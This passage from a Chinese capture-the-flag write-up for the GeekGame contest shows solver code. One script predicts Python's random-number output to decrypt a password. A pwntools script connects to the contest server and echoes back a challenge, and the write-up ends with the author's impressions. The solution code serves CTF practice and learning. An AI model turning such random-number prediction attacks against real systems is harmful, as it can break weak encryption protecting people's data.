        ab = int.from_bytes(C[p+start:p+start+4],byteorder='little')
        abc = int.from_bytes(password[p:p+4], byteorder='little')
        rc.submit(ab ^ abc)
    next_ab = int.from_bytes(C[start+2496:start+2500],byteorder='little')
    predict_c = rc.predict_getrandbits(32)
    next_abc = int.from_bytes(password[2496:2500], byteorder='little')
    if next_ab ^ predict_c == next_abc:
        print("found!", start, len(password))
        for i in range(2500, len(password), 4):
            next_ab = int.from_bytes(C[start+i:start+i+4],byteorder='little')
            next_c  = rc.predict_getrandbits(32)
            next_abc = int.from_bytes(password[i:i+4], byteorder='little')
            int32 = next_ab ^ next_c ^ next_abc
            answer += int32.to_bytes(length=4,byteorder='little')
        print(answer)
        exit(0)
```

​	**flag3:**

​		这题更是重量级，观察代码，发现只要把给出的数据在 10 秒内输回去即可。出题人的疏忽让我们直接少做一个题。

```python
from pwn import *

ip = "prob08.geekgame.pku.edu.cn"
port = 10008
token = b"9:How do you know my uid is 9"

r = remote(ip, port)
r.sendline(token)

print(r.recv())
r.sendline(b'3')
s = r.recvuntil('>')
s = s[s.find(b'<')+1:s.find(b'>')]
s = s.replace(b"0x",b'')

r.sendline(s)
r.interactive()
```

#### 总结

~~题出的好！难度适中，覆盖知识点广，题目又着切合实际的背景，解法比较自然。
给出题人点赞 ！~~

总体来讲还是很有意思的，题面有梗，题目难度有梯度，非常适合~~休闲娱乐~~爆肝。

本萌新也是在这里第一次做出 pwn 题~~（享受攻入后台的快感）~~。

明年一定还来！